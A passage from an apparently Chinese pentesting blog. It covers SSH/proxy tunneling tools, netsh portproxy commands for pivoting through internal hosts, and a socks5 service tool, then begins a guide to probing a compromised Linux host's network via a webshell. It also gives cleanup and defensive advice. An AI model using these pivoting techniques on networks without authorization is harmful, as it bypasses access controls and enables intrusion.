!important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">在渗透测试的时候，这样的多链路代理会有比较大的用处。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">切记，隧道和多链路代理本身已经打破了信息系统中固有的访问控制策略，如果你不能保证你自己的环境是否安全，请不要给客户增加额外的麻烦。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">注：Proxifier跟VMware Workstation在功能上有冲突，如果安装了Proxifier，VM的虚拟机共享功能就无法使用。我之前遇到这个问题，蛋疼地把系统都重装好几次才意识到它俩有冲突。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);text-align: center;white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><h2 style="margin: 10px auto;font-size:24px;line-height:44px;;max-width: 620px;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;color: rgb(0, 122, 170);font-size:18px;line-height:38px;;box-sizing: border-box !important;word-wrap: break-word !important;"><strong style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;">第三个工具：SSH Proxy</strong></span></h2><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">算是SSH Tunnel的姊妹，同一个开发者，也是只有Mac下才有的工具。一般两者配合使用，基本上可以不用Proxifier了。它其实就做做了一个SSH的动态隐射而已。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);text-align: center;white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">配置好本地的映射端口，代理的服务器和对应的身份验证信息就可以了。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">SSH Proxy的白名单功能比较好用，如果只需要对特定的站点或IP地址进行代理，就把IP地址添加到白名单里就可以了。但相比Proxifier，就没有的ProxyChains功能和多链路代理功能。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">忠告：不建议使用SSH隧道出墙，因为流量特征明显，非常容易被屏蔽。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><h2 style="margin: 10px auto;font-size:24px;line-height:44px;;max-width: 620px;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;color: rgb(0, 122, 170);font-size:18px;line-height:38px;;box-sizing: border-box !important;word-wrap: break-word !important;"><strong style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;">第四个工具：windows专用的sock5代理工具</strong></span></h2><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">这个工具很小，可以使用命令行方式安装，可以在系统中注册成一个服务，随系统启动。也可以使用下面的命令行来运行这个服务，监听的端口是10086。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">这个工具只有三个参数：</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;">socks5.exe -i 安装socks5代理服务</p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;">socks5.exe -d 删除服务</p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;">socks5.exe -r 直接运行代理，不会注册一个新的服务。</p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">为了避免测试结束之后就忘记了，建议还是用-r方式直接运行，使用完毕就kill掉这个进程。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><h2 style="margin: 10px auto;font-size:24px;line-height:44px;;max-width: 620px;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;color: rgb(0, 122, 170);font-size:18px;line-height:38px;;box-sizing: border-box !important;word-wrap: break-word !important;"><strong style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;">第五个工具：netsh</strong></span></h2><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">我自己用得也不是很多，暂时还没有好的案例可以分享，但是在内网中效果还是很不错的。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">命令行格式如下：</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">创建端口映射</span></p><pre style="margin-top: 0px;margin-bottom: 0px;padding: 0px;max-width: 620px;color: rgb(62, 62, 62);font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin: 5px 10px;padding: 10px;max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;font-stretch: normal;line-height: normal;">netsh interface portproxy add &nbsp;v4tov4 listenaddress=192.168.100.100 listenport=8443 connectaddress=10.10.10.2 connectport=8443<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  /></code></pre><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">删除端口映射</span></p><pre style="margin-top: 0px;margin-bottom: 0px;padding: 0px;max-width: 620px;color: rgb(62, 62, 62);font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin: 5px 10px;padding: 10px;max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;font-stretch: normal;line-height: normal;">netsh interface &nbsp;portproxy delete v4tov4 listenaddress=192.168.100.100 listenport=8443<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  /></code></pre><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">查看当前所有的端口映射规则：</span></p><pre style="margin-top: 0px;margin-bottom: 0px;padding: 0px;max-width: 620px;color: rgb(62, 62, 62);font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin: 5px 10px;padding: 10px;max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;font-stretch: normal;line-height: normal;">netsh interface &nbsp;portproxy show &nbsp;v4tov4<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  /></code></pre><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">同样的，如果你能够在多台服务器上创建端口转发的链路，效果和ssh隧道几乎是一样的。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">最后，渗透测试结束的时候，务必清除你创建的所有代理链路。毕竟，这些代理隧道已经打破了内网的访问控制策略了。（使用-N 和 -f选项建立的SSH会话运行在后台，只能kill掉对应的进程，但别kill错了）</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">如果你用我的方式去修改了known_hosts文件，也要把对应的公钥信息做清理。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><h2 style="margin: 10px auto;font-size:24px;line-height:44px;;max-width: 620px;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;color: rgb(0, 122, 170);font-size:18px;line-height:38px;;box-sizing: border-box !important;word-wrap: break-word !important;"><strong style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;">总结</strong></span></h2><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">隧道之所以能成功，前提是系统中访问控制不足。如果系统中配置了SSH远程管理的白名单，或者在ACL里限制特定的IP才能连接SSH，又或者系统完全使用带外管理，那就得两说了。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">对于甲方来说，SSH固然是最常用的一种远程管理工具，SSH本身安全性也可以保障。但一定要意识到，安全工具，往往也会沦为攻击的重要手段。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">如果没有足够的资源来建立带外管理的网络结构，内网中至少要限制SSH远程登录的地址和双向的访问控制策略（从外部到内部，从内部到外部）</span><span style="max-width: 100%;font-size:16px;line-height:36px;;line-height: 22.4px;box-sizing: border-box !important;word-wrap: break-word !important;">切记，再牛逼的安全防护策略，也敌不过内网里遍地的弱口令。</span></p><p style="text-align: left;"><br  /></p><h2 class="rich_media_title" style="text-align: center;"><span style="color: rgb(61, 167, 66);"><strong><span style="font-size:20px;line-height:40px;;">Linux内网渗透</span></strong></span></h2><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="color: rgb(0, 122, 170);"><strong><span style="font-size:18px;line-height:38px;;">收集测试网络环境</span></strong></span></h3><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">当我们拿到一台目标内网服务器，或者说肉鸡服务器，首先要做的就是收集信息。而在我看来需要收集的信息中，最重要的之一便是肉鸡的网络环境。</p><h4 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.2em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="font-size:16px;line-height:36px;;">实验环境</span></h4><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">首先介绍下本次测试的服务器环境：</p><ul class=" list-paddingleft-2" style=""><li><p style="max-width: 100%;min-height: 1em;box-sizing: border-box !important;word-wrap: break-word !important;">攻击机Mac：110.xx.xx.xx 外网</p></li><li><p style="max-width: 100%;min-height: 1em;box-sizing: border-box !important;word-wrap: break-word !important;">肉鸡centos：192.168.16.x 目标内网16网段系统</p></li><li><p style="max-width: 100%;min-height: 1em;margin-bottom: 15px;box-sizing: border-box !important;word-wrap: break-word !important;">内网渗透范围：192.168.17.0/24 目标内网17网段系统</p></li></ul><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">本次测试模拟假设：由于肉鸡服务器上对外开放了存在漏洞的web应用，被入侵植入webshell。</p><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">本次测试目的：通过肉鸡服务器上的shell，深入渗透内网17网段的服务器。</p><h4 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.2em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="font-size:16px;line-height:36px;;">收集测试哪些网络数据？</span></h4><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">OK，目前我已经拥有了肉鸡的shell，那么该收集肉鸡服务器的哪些网络环境呢？又该如何去测试？我认为至少要收集以下几点网络环境信息：</p><ul class=" list-paddingleft-2" style=""><li><p style="max-width: 100%;min-height: 1em;box-sizing: border-box !important;word-wrap: break-word !important;">肉鸡服务器与外网的连通性</p></li><li><p style="max-width: 100%;min-height: 1em;box-sizing: border-box !important;word-wrap: break-word !important;">肉鸡服务器与内网其他网段的连通性</p></li><li><p style="max-width: 100%;min-height: 1em;box-sizing: border-box !important;word-wrap: break-word !important;">肉鸡服务器与外网之间是否有端口访问限制</p></li><li><p style="max-width: 100%;min-height: 1em;margin-bottom: 15px;box-sizing: border-box !important;word-wrap: break-word !important;">肉鸡服务器与内网其他网段之间是否有端口访问限制</p></li></ul><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">注：连通性主要是指能否ping通，需要双方互相ping测试；端口访问限制，指的是目标网络边界是否有堡垒机或者防火墙，对进出的端口是否有做限制。</p><h4 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.2em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="font-size:16px;line-height:36px;;">端口访问限制测试</span></h4><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">ping测试这里不介绍了，主要说下如何测试端口访问限制，可以使用的工具如下：</p><ul class=" list-paddingleft-2" style=""><li><p style="max-width: 100%;min-height: 1em;box-sizing: border-box !important;word-wrap: break-word !important;">curl、wget（可连接web服务，主要为80、443、8000+端口）</p></li><li><p style="max-width: 100%;min-height: 1em;box-sizing: border-box !important;word-wrap: break-word !important;">telnet（可主动连接指定ip的指定port）</p></li><li><p style="max-width: 100%;min-height: 1em;box-sizing: border-box !important;word-wrap: break-word !important;">nmap（可扫描端口，open或者filter）</p></li><li><p style="max-width: 100%;min-height: 1em;box-sizing: border-box !important;word-wrap: break-word !important;">ncat（可以创建端口监听，也可以主动连接）</p></li><li><p style="max-width: 100%;min-height: 1em;box-sizing: border-box !important;word-wrap: break-word !important;">python（可主动创建端口监听）<br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  />……</p></li></ul><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">在测试端口访问限制前，我们先要搞清楚当前的网络环境。本次测试中，攻击机在外网而肉鸡在内网，因此正常情况下攻击机是无法直接访问到肉鸡上某个端口的（需要网络边界路由器做端口映射）。</p><h5 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: 